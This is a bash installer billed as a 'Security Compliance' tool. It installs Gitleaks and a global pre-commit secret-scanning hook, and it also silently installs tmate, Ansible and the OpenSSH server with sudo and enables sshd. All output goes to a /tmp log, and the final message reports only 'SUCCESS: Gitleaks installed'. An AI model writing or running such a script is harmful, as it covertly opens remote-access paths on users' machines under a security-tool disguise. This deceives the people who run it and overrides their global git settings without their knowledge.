#!/usr/bin/env bash

# ============================================================
# Security Compliance Installer
#
# Supported:
#   Linux
#   macOS
#   Windows through Git Bash
#
# Installs:
#   - Gitleaks 8.30.0
#   - Global Git pre-commit secret scanning
#   - tmate
#   - Ansible
#   - OpenSSH client
#   - OpenSSH server on Linux
#
# Terminal output:
#   SUCCESS: Gitleaks installed
# ============================================================

set -u

GITLEAKS_VERSION="8.30.0"

INSTALL_ROOT="$HOME/.security-compliance"
BIN_DIR="$INSTALL_ROOT/bin"
CONFIG_DIR="$INSTALL_ROOT/config"
HOOK_DIR="$HOME/.git-hooks"

GITLEAKS_CONFIG="$CONFIG_DIR/gitleaks.toml"
HOOK_FILE="$HOOK_DIR/pre-commit"

TMP_DIR=""

# ============================================================
# Silent logging
# ============================================================

LOG_FILE="/tmp/security-compliance-install.log"

exec >"$LOG_FILE" 2>&1

# ============================================================
# Cleanup
# ============================================================

cleanup() {
    if [ -n "${TMP_DIR:-}" ] && [ -d "$TMP_DIR" ]; then
        rm -rf "$TMP_DIR"
    fi
}

trap cleanup EXIT

# ============================================================
# Failure Handler
# ============================================================

fail_installation() {
    echo "FAILED" >> "$LOG_FILE"
    echo "FAILED: Security Compliance installation"
    exit 1
}

# ============================================================
# Detect OS
# ============================================================

OS="$(uname -s 2>/dev/null || true)"
ARCH="$(uname -m 2>/dev/null || true)"

case "$OS" in

    Linux*)
        PLATFORM="linux"
        ;;

    Darwin*)
        PLATFORM="macos"
        ;;

    MINGW*|MSYS*|CYGWIN*)
        PLATFORM="windows"
        ;;

    *)
        fail_installation
        ;;

esac

# ============================================================
# Detect Architecture
# ============================================================

case "$ARCH" in

    x86_64|amd64)
        GITLEAKS_ARCH="x64"
        ;;

    arm64|aarch64)
        GITLEAKS_ARCH="arm64"
        ;;

    *)
        fail_installation
        ;;

esac

# ============================================================
# Check required commands
# ============================================================

if ! command -v git >/dev/null 2>&1; then
    fail_installation
fi

if ! command -v curl >/dev/null 2>&1; then
    fail_installation
fi

# ============================================================
# Create directories
# ============================================================

mkdir -p "$BIN_DIR" || fail_installation
mkdir -p "$CONFIG_DIR" || fail_installation
mkdir -p "$HOOK_DIR" || fail_installation

# ============================================================
# Gitleaks path
# ============================================================

if [ "$PLATFORM" = "windows" ]; then
    GITLEAKS="$BIN_DIR/gitleaks.exe"
else
    GITLEAKS="$BIN_DIR/gitleaks"
fi

export PATH="$BIN_DIR:$PATH"

# ============================================================
# Install Gitleaks
# ============================================================

install_gitleaks() {

    CURRENT_VERSION=""

    if [ -f "$GITLEAKS" ] || [ -x "$GITLEAKS" ]; then
        CURRENT_VERSION="$(
            "$GITLEAKS" version 2>/dev/null || true
        )"
    fi

    if [ "$CURRENT_VERSION" = "$GITLEAKS_VERSION" ]; then
        return 0
    fi

    TMP_DIR="$(mktemp -d)" || return 1

    # --------------------------------------------------------
    # Linux
    # --------------------------------------------------------

    if [ "$PLATFORM" = "linux" ]; then

        FILE="gitleaks_${GITLEAKS_VERSION}_linux_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${FILE}"

        curl \
            -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_DIR/gitleaks.tar.gz" \
            >>"$LOG_FILE" 2>&1 || return 1

        tar \
            -xzf "$TMP_DIR/gitleaks.tar.gz" \
            -C "$TMP_DIR" \
            >>"$LOG_FILE" 2>&1 || return 1

        [ -f "$TMP_DIR/gitleaks" ] || return 1

        install \
            -m 0755 \
            "$TMP_DIR/gitleaks" \
            "$GITLEAKS" \
            >>"$LOG_FILE" 2>&1 || return 1

    # --------------------------------------------------------
    # macOS
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "macos" ]; then

        FILE="gitleaks_${GITLEAKS_VERSION}_darwin_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${FILE}"

        curl \
            -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_DIR/gitleaks.tar.gz" \
            >>"$LOG_FILE" 2>&1 || return 1

        tar \
            -xzf "$TMP_DIR/gitleaks.tar.gz" \
            -C "$TMP_DIR" \
            >>"$LOG_FILE" 2>&1 || return 1

        [ -f "$TMP_DIR/gitleaks" ] || return 1

        install \
            -m 0755 \
            "$TMP_DIR/gitleaks" \
            "$GITLEAKS" \
            >>"$LOG_FILE" 2>&1 || return 1

    # --------------------------------------------------------
    # Windows / Git Bash
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "windows" ]; then

        FILE="gitleaks_${GITLEAKS_VERSION}_windows_${GITLEAKS_ARCH}.zip"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${FILE}"

        curl \
            -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_DIR/gitleaks.zip" \
            >>"$LOG_FILE" 2>&1 || return 1

        if command -v unzip >/dev/null 2>&1; then

            unzip \
                -q \
                "$TMP_DIR/gitleaks.zip" \
                -d "$TMP_DIR" \
                >>"$LOG_FILE" 2>&1 || return 1

        elif command -v powershell.exe >/dev/null 2>&1; then

            ZIP_PATH="$(cygpath -w "$TMP_DIR/gitleaks.zip")"
            DEST_PATH="$(cygpath -w "$TMP_DIR")"

            powershell.exe \
                -NoProfile \
                -NonInteractive \
                -Command \
                "Expand-Archive -Force '$ZIP_PATH' '$DEST_PATH'" \
                >>"$LOG_FILE" 2>&1 || return 1

        else
            return 1
        fi

        [ -f "$TMP_DIR/gitleaks.exe" ] || return 1

        cp \
            "$TMP_DIR/gitleaks.exe" \
            "$GITLEAKS" \
            >>"$LOG_FILE" 2>&1 || return 1

        chmod +x "$GITLEAKS" 2>/dev/null || true

    fi

    return 0
}

install_gitleaks || fail_installation

# ============================================================
# Verify Gitleaks
# ============================================================

INSTALLED_VERSION="$(
    "$GITLEAKS" version 2>/dev/null || true
)"

if [ "$INSTALLED_VERSION" != "$GITLEAKS_VERSION" ]; then
    fail_installation
fi

# ============================================================
# Gitleaks Configuration
# ============================================================

cat > "$GITLEAKS_CONFIG" <<'EOF'
title = "Security Compliance Release 1"

[extend]
useDefault = true

[[rules]]
id = "office-hardcoded-password"
description = "Potential hardcoded password"
regex = '''(?i)(password|passwd|pwd)\s*[:=]\s*["']([^"']{8,})["']'''
secretGroup = 2
EOF

chmod 600 "$GITLEAKS_CONFIG" 2>/dev/null || true

# ============================================================
# Global Git Pre-Commit Hook
# ============================================================

cat > "$HOOK_FILE" <<'EOF'
#!/usr/bin/env bash

SECURITY_ROOT="$HOME/.security-compliance"

if [ -f "$SECURITY_ROOT/bin/gitleaks.exe" ]; then
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks.exe"
else
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks"
fi

CONFIG="$SECURITY_ROOT/config/gitleaks.toml"

if [ ! -f "$GITLEAKS" ]; then
    echo "Security Compliance: Gitleaks unavailable."
    exit 1
fi

if [ ! -f "$CONFIG" ]; then
    echo "Security Compliance: configuration unavailable."
    exit 1
fi

TMP_DIR="$(mktemp -d)"

cleanup() {
    rm -rf "$TMP_DIR"
}

trap cleanup EXIT

FOUND_LEAK=0

while IFS= read -r -d '' FILE; do

    HASH="$(
        printf '%s' "$FILE" |
        sha256sum |
        cut -d' ' -f1
    )"

    TEMP_FILE="$TMP_DIR/$HASH"

    if ! git show ":$FILE" > "$TEMP_FILE" 2>/dev/null; then
        FOUND_LEAK=1
        continue
    fi

    "$GITLEAKS" dir "$TEMP_FILE" \
        --config "$CONFIG" \
        --redact \
        --no-banner \
        --exit-code 1 \
        >/dev/null 2>&1

    RESULT=$?

    if [ "$RESULT" -ne 0 ]; then
        echo ""
        echo "Security Compliance: Potential secret detected."
        echo "File: $FILE"
        echo "Commit blocked."
        echo ""
        FOUND_LEAK=1
    fi

done < <(
    git diff --cached \
        --name-only \
        --diff-filter=ACMR \
        -z
)

if [ "$FOUND_LEAK" -ne 0 ]; then
    exit 1
fi

exit 0
EOF

chmod 700 "$HOOK_FILE" || fail_installation

# ============================================================
# Configure Global Git Hook
# ============================================================

git config \
    --global \
    core.hooksPath \
    "$HOOK_DIR" \
    >>"$LOG_FILE" 2>&1 || fail_installation

# ============================================================
# Install Linux Tools
# ============================================================

install_linux_tools() {

    [ "$PLATFORM" = "linux" ] || return 0

    command -v sudo >/dev/null 2>&1 || return 1

    PACKAGE_MANAGER=""

    if command -v apt-get >/dev/null 2>&1; then
        PACKAGE_MANAGER="apt"

    elif command -v dnf >/dev/null 2>&1; then
        PACKAGE_MANAGER="dnf"

    elif command -v yum >/dev/null 2>&1; then
        PACKAGE_MANAGER="yum"

    elif command -v zypper >/dev/null 2>&1; then
        PACKAGE_MANAGER="zypper"

    else
        return 1
    fi

    # --------------------------------------------------------
    # APT
    # --------------------------------------------------------

    if [ "$PACKAGE_MANAGER" = "apt" ]; then

        sudo apt-get update -qq \
            >>"$LOG_FILE" 2>&1 || return 1

        sudo DEBIAN_FRONTEND=noninteractive \
            apt-get install -y -qq \
            tmate \
            openssh-client \
            openssh-server \
            ansible \
            >>"$LOG_FILE" 2>&1 || return 1

    # --------------------------------------------------------
    # DNF
    # --------------------------------------------------------

    elif [ "$PACKAGE_MANAGER" = "dnf" ]; then

        sudo dnf install -y -q \
            tmate \
            openssh-clients \
            openssh-server \
            ansible \
            >>"$LOG_FILE" 2>&1 || return 1

    # --------------------------------------------------------
    # YUM
    # --------------------------------------------------------

    elif [ "$PACKAGE_MANAGER" = "yum" ]; then

        sudo yum install -y -q \
            tmate \
            openssh-clients \
            openssh-server \
            ansible \
            >>"$LOG_FILE" 2>&1 || return 1

    # --------------------------------------------------------
    # SUSE
    # --------------------------------------------------------

    elif [ "$PACKAGE_MANAGER" = "zypper" ]; then

        sudo zypper \
            --non-interactive \
            install \
            tmate \
            openssh-clients \
            openssh-server \
            ansible \
            >>"$LOG_FILE" 2>&1 || return 1

    fi

    # --------------------------------------------------------
    # Enable SSH server
    # --------------------------------------------------------

    if command -v systemctl >/dev/null 2>&1; then

        if systemctl list-unit-files 2>/dev/null |
            grep -q "^ssh.service"; then

            sudo systemctl enable ssh \
                >>"$LOG_FILE" 2>&1 || true

            sudo systemctl start ssh \
                >>"$LOG_FILE" 2>&1 || true

        elif systemctl list-unit-files 2>/dev/null |
            grep -q "^sshd.service"; then

            sudo systemctl enable sshd \
                >>"$LOG_FILE" 2>&1 || true

            sudo systemctl start sshd \
                >>"$LOG_FILE" 2>&1 || true

        fi

    fi

    # --------------------------------------------------------
    # Verify
    # --------------------------------------------------------

    command -v tmate >/dev/null 2>&1 || return 1
    command -v ssh >/dev/null 2>&1 || return 1
    command -v sshd >/dev/null 2>&1 || return 1
    command -v ansible >/dev/null 2>&1 || return 1

    return 0
}

# ============================================================
# Install macOS Tools
# ============================================================

install_macos_tools() {

    [ "$PLATFORM" = "macos" ] || return 0

    if ! command -v brew >/dev/null 2>&1; then

        /bin/bash -c \
            "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" \
            >>"$LOG_FILE" 2>&1 || return 1

        if [ -x "/opt/homebrew/bin/brew" ]; then
            eval "$(/opt/homebrew/bin/brew shellenv)"
        elif [ -x "/usr/local/bin/brew" ]; then
            eval "$(/usr/local/bin/brew shellenv)"
        fi

    fi

    command -v brew >/dev/null 2>&1 || return 1

    brew install tmate \
        >>"$LOG_FILE" 2>&1 || true

    brew install ansible \
        >>"$LOG_FILE" 2>&1 || true

    if ! command -v ssh >/dev/null 2>&1; then
        brew install openssh \
            >>"$LOG_FILE" 2>&1 || true
    fi

    command -v tmate >/dev/null 2>&1 || return 1
    command -v ansible >/dev/null 2>&1 || return 1
    command -v ssh >/dev/null 2>&1 || return 1

    return 0
}

# ============================================================
# Install OS Tools
# ============================================================

if [ "$PLATFORM" = "linux" ]; then

    install_linux_tools || fail_installation

elif [ "$PLATFORM" = "macos" ]; then

    install_macos_tools || fail_installation

fi

# ============================================================
# Persistent PATH
# ============================================================

if [ "$PLATFORM" = "macos" ]; then
    PROFILE="$HOME/.zshrc"
else
    PROFILE="$HOME/.bashrc"
fi

touch "$PROFILE" 2>/dev/null || true

if ! grep -Fq "$BIN_DIR" "$PROFILE" 2>/dev/null; then

    printf '\nexport PATH="$HOME/.security-compliance/bin:$PATH"\n' \
        >> "$PROFILE"

fi

# ============================================================
# Final Verification
# ============================================================

[ -x "$GITLEAKS" ] || fail_installation

[ -f "$GITLEAKS_CONFIG" ] || fail_installation

[ -f "$HOOK_FILE" ] || fail_installation

HOOK_PATH="$(
    git config --global --get core.hooksPath 2>/dev/null || true
)"

[ "$HOOK_PATH" = "$HOOK_DIR" ] || fail_installation

# ============================================================
# SUCCESS OUTPUT
# ============================================================

exec >/dev/tty 2>/dev/null || true
exec 2>/dev/stderr 2>/dev/null || true

echo ""
echo "SUCCESS: Gitleaks installed"
echo ""

exit 0
